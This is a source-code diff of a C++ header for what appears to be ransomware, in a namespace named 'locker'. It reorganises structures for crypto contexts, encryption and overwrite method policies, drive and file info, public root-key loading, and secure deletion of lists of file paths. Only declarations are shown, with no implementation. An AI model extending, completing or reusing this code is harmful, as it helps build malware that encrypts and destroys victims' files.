@@ -78,15 +78,15 @@ namespace locker
 		SLIST<HLIST>* HashList;
 	}*PHASH_DATA, HASH_DATA;
 
-	typedef struct CryptCTXInfo
+	typedef struct list_path_sd
 	{
-		VOID* ctx;
-		descriptor desc;
-		HASH_DATA hash_data;
-		CONST char* name;
-		u32 mode;
-		BYTE* zeros;
-		BYTE* random;
+		char* path;
+		bool state;
+		LIST_ENTRY(list_path_sd);
+	} LIST_PSD, *PLIST_PSD;
+
+	typedef struct methods_policy
+	{
 		CryptoPolicy method_policy;
 		GenPolicy gen_policy;
 		EncryptMethodFunc crypt_method;
@@ -96,6 +96,19 @@ namespace locker
 		OptionNameFunc name_method;
 		OverWriteFunc overwrite_method;
 		HashSumFunc hash_sum_method;
+	} METHOD_POLICY, *PMETHOD_POLICY;
+
+	typedef struct CryptCTXInfo
+	{
+		VOID* ctx;
+		descriptor desc;
+		HASH_DATA hash_data;
+		CONST char* name;
+		u32 mode;
+		BYTE* zeros;
+		BYTE* random;
+		LIST<LIST_PSD>* list_psd;
+		METHOD_POLICY methods;
 	} CRYPT_INFO, * PCRYPT_INFO;
 
 	typedef struct file_info
@@ -121,7 +134,7 @@ namespace locker
 	std::pair<size_t, size_t> get_count_op();
 	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
 	void free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO, bool success);
-	bool SecureDelete(CONST char* FilePath);
+	bool safe_delete_file(LIST<LIST_PSD>* list_psd);
 	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
 	
 	void LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
@@ -139,7 +152,7 @@ typedef locker::FILE_INFO FILE_INFO;
 typedef locker::HLIST HLIST;
 typedef locker::HEAD_BLOCK HEAD_BLOCK;
 typedef locker::PHEAD_BLOCK PHEAD_BLOCK;
-
-
+typedef locker::LIST_PSD LIST_PSD;
+typedef locker::PLIST_PSD PLIST_PSD;
 
 #endif
